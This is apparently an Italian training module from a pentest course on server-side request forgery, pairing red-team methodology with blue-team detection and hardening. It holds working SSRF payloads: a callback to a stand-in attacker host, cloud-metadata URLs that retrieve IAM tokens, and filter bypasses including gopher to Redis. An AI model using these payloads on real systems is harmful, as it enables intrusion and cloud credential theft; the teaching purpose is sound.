> [English](README.en.md) | **Italiano**

# SSRF - Server-Side request forgery

> - **Fase:** Web exploitation - OWASP A10:2021 Server-Side Request Forgery
> - **Visibilita:** Media - richieste in uscita dal server verso destinazioni scelte dall'attaccante; le varianti blind si confermano via callback out-of-band
> - **Prerequisiti:** un endpoint che preleva o raggiunge una URL/host fornito (anche indirettamente) dall'utente: import-da-URL, webhook, anteprime link, proxy, generatori PDF, parser di immagini remote
> - **Natura del documento:** metodologia + payload pratici per ambiente di laboratorio. Valori di esempio (169.254.169.254, host interni); nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: indurre il server a effettuare richieste verso risorse interne o verso i metadata del cloud provider, trasformando la web app in un proxy verso la rete interna e, nel cloud, in una via diretta al furto di credenziali.

---

## Executive summary

La SSRF si verifica quando un'applicazione effettua una richiesta di rete verso una destinazione che
l'attaccante puo controllare. Il server, in quanto "fidato" sulla rete interna, raggiunge cose che
l'attaccante da fuori non potrebbe: servizi su `localhost`, database e pannelli interni non esposti, e -
soprattutto nel cloud - l'endpoint dei metadata dell'istanza (`169.254.169.254`), che restituisce le
credenziali temporanee del ruolo associato alla macchina.

L'impatto va dalla semplice ricognizione interna (port scan, accesso a servizi non autenticati) fino al
`Critico` quando la SSRF raggiunge i metadata cloud e ruba un token IAM: da li si scala nel cloud (vedi
modulo 10). E il vettore che collega web security e cloud security ed e il motivo per cui e passata nella
OWASP Top 10 come categoria a se (A10:2021).

## Contesto operativo (perche, prima del come)

La SSRF si cerca ovunque il server "vada a prendere qualcosa" a partire da input: campi URL, webhook,
anteprime di link, conversioni (HTML-to-PDF, immagini remote), proxy e importer. La decisione operativa e
distinguere la SSRF in-band (la risposta remota torna nel corpo: ricognizione immediata) da quella blind (nessun
contenuto in risposta: si conferma con un callback OOB verso un server controllato). Il bersaglio di maggior
valore, nel cloud, e sempre l'endpoint dei metadata.

## Esecuzione / comandi

### Fase 1 - conferma (callback out-of-band)

Si punta il parametro verso un host controllato e si osserva la richiesta in arrivo:

```bash
# parametro vulnerabile puntato al proprio listener / collaborator
url=http://attacker.lab:8000/ssrf-probe
# il server effettua la richiesta -> arriva sul listener: SSRF confermata (anche blind)
```

### Fase 2 - accesso a servizi interni

```bash
url=http://127.0.0.1:8080/        # pannelli/servizi legati a localhost
url=http://127.0.0.1:6379/        # redis, memcached e altri servizi interni non autenticati
url=http://169.254.169.254/       # endpoint metadata cloud (vedi Fase 3)
```

### Fase 3 - metadata del cloud (furto credenziali)

```bash
# AWS IMDSv1 (se non forzato IMDSv2): elenca ed estrae le credenziali del ruolo IAM dell'istanza
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<nome-ruolo>

# GCP: richiede l'header Metadata-Flavor: Google (quando l'app lo consente / via gopher o header injection)
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS: header Metadata: true
url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Output illustrativo (rappresentativo, token redatto):

```
{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"****","Token":"****"}   <-- credenziali IAM temporanee
```

### Bypass comuni dei filtri

```bash
127.0.0.1  ->  2130706433 (decimale)  ->  0x7f000001 (hex)  ->  127.1  ->  [::1]   # rappresentazioni alternative
http://attacker.lab/redirect?to=http://169.254.169.254/   # redirect aperto verso il target interno
http://169.254.169.254.nip.io/                            # DNS che risolve all'IP interno
gopher://127.0.0.1:6379/_<comandi redis>                  # gopher per parlare con servizi non-HTTP (SSRFmap/Gopherus)
```

## Analisi dei risultati

Un callback OOB ricevuto conferma la SSRF (anche quando la risposta non mostra nulla). L'accesso a `localhost`
o a servizi interni dimostra la ricognizione; il recupero di credenziali IAM dai metadata porta la severity a
`Critico` (controllo potenziale dell'account cloud). Se il server applica un'allowlist rigida di destinazioni o
blocca l'accesso ai metadata (IMDSv2 con hop limit, egress filtering), il vettore e chiuso e il finding si
riduce.

### Analisi teorica

La SSRF nasce dalla fiducia implicita nella posizione di rete: il server e dentro il perimetro, quindi puo
raggiungere cio che l'esterno non puo. L'attaccante "presta" la propria intenzione al server, che agisce come
confused deputy (vice confuso): esegue una richiesta legittima nella forma ma scelta dall'attaccante nella
destinazione. La contromisura non e filtrare le "URL cattive" (aggirabile con encoding/redirect/DNS) ma
ribaltare il modello: allowlist esplicita delle destinazioni consentite, e togliere al layer di rete il
privilegio implicito (egress filtering, IMDSv2). Collega al tema generale della confusione tra dato e
destinazione.

## Remediation (blue team)

**Rilevamento (WAF/SIEM).**
- Richieste in uscita dal web server verso `169.254.169.254`, `localhost`/`127.0.0.1`, o IP privati.
- Parametri contenenti URL, IP in forme alternative (decimale/hex), schemi inattesi (`gopher://`, `file://`).
- Traffico verso l'endpoint metadata originato da processi applicativi.

**Hardening.**
- Allowlist esplicita delle destinazioni; mai passare una URL utente grezza a un client HTTP.
- Bloccare schemi non necessari (`file`, `gopher`, `dict`) e le destinazioni interne/metadata.
- Cloud: imporre IMDSv2 (token obbligatorio) con hop limit 1; egress filtering dalla subnet applicativa.
- Risolvere il nome e validare l'IP finale (anti-DNS-rebinding), non solo la stringa URL.

---

## Scenario reale: proiezione post-exploitation

> Vale per l'esito "SSRF verso metadata / servizi interni" (severity Alto/Critico).

### Prospettiva attaccante (red team)

**Punto di partenza:** endpoint che preleva una URL fornita dall'utente, con SSRF confermata (Fase 1).

**Passo successivo immediato:** puntare l'endpoint dei metadata cloud ed estrarre le credenziali IAM del ruolo
dell'istanza.

**Kill chain proiettata:**

```
Endpoint vulnerabile a SSRF
        |
        v
SSRF -> 169.254.169.254 -> credenziali IAM temporanee del ruolo
        |
        v
Uso del token con la AWS/Azure/GCP CLI (accesso ai servizi del ruolo)
        |
        v
Enumerazione ed escalation nel cloud (vedi modulo 10): S3, segreti, nuove risorse
```

**Impatto potenziale:** da una vulnerabilita web al controllo (parziale o totale) dell'account cloud, senza mai
toccare direttamente la macchina. In rete interna, SSRF abilita ricognizione e accesso a servizi non esposti.

**Vettori di monetizzazione tipici:** furto dati dai bucket/DB raggiunti; abuso delle risorse cloud
(cryptomining); persistenza nel tenant.

### Prospettiva difensore (blue team)

**Rilevamento:** richieste del web server verso metadata/IP interni; parametri URL con IP offuscati o schemi
inattesi.

**Indicatori di compromissione (IoC):**
- Connessioni dal processo web verso `169.254.169.254` o host interni.
- Parametri con `gopher://`/`file://`, IP in decimale/hex, domini che risolvono a IP privati.
- Chiamate alla cloud API con credenziali del ruolo dell'istanza da sorgenti inattese.

**Contenimento:** blocco del pattern via WAF; rotazione immediata delle credenziali del ruolo potenzialmente
esposte; verifica delle azioni compiute con quel token.

**Eradicazione e hardening:** allowlist delle destinazioni; IMDSv2; egress filtering; validazione dell'IP
risolto.

**Lezione difensiva:** la SSRF dimostra che la posizione di rete non e una garanzia di sicurezza. Nel cloud, un
SSRF che on-premise era "solo" ricognizione interna diventa furto di credenziali: la stessa vulnerabilita cambia
gravita col contesto.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` (collaborator) | proxy/scanner | web - attivo | intercetta i parametri e conferma le ssrf blind via callback oob |
| `curl` | client http | cli - attivo | invio manuale delle richieste e test delle rappresentazioni ip |
| `SSRFmap` | exploit tool | cli - attivo | automazione dello sfruttamento ssrf (metadata, gopher, port scan) |
| `Gopherus` | payload generator | cli - attivo | genera payload `gopher://` per parlare con redis/mysql/smtp interni |

## Note di metodologia

In lab reale (app con import-da-URL o un target OWASP) i dati da documentare come finding: la conferma OOB, i
servizi interni raggiunti e l'eventuale recupero di credenziali dai metadata. Le credenziali reali vanno
trattate come dati sensibili e redatte nel report.

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | sfruttamento dell'endpoint che effettua richieste verso destinazioni controllate dall'attaccante. |
| credential access | unsecured credentials: cloud instance metadata api | `T1552.005` | recupero delle credenziali iam dall'endpoint dei metadata via ssrf. |
| discovery | network service discovery | `T1046` | uso della ssrf per scansionare servizi interni non esposti. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [xxe](<../xxe (XML External Entity)/README.md>) | ssrf | l'xxe puo essere un vettore di ssrf (entita esterna verso i metadata) |
| ssrf (credenziali iam) | [10-cloud-security](<../../../10-cloud-security (Cloud&Modern)/README.md>) | il token rubato apre l'enumerazione e l'escalation nel cloud |
| ssrf | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (allowlist, imdsv2) si collega al laboratorio di secure coding |

---

> **Nota:** Contenuto didattico. I payload sono funzionanti e vanno eseguiti esclusivamente su applicazioni di proprieta o con autorizzazione esplicita, in ambiente di laboratorio. IP/host sono valori di esempio; credenziali e token illustrativi/redatti.
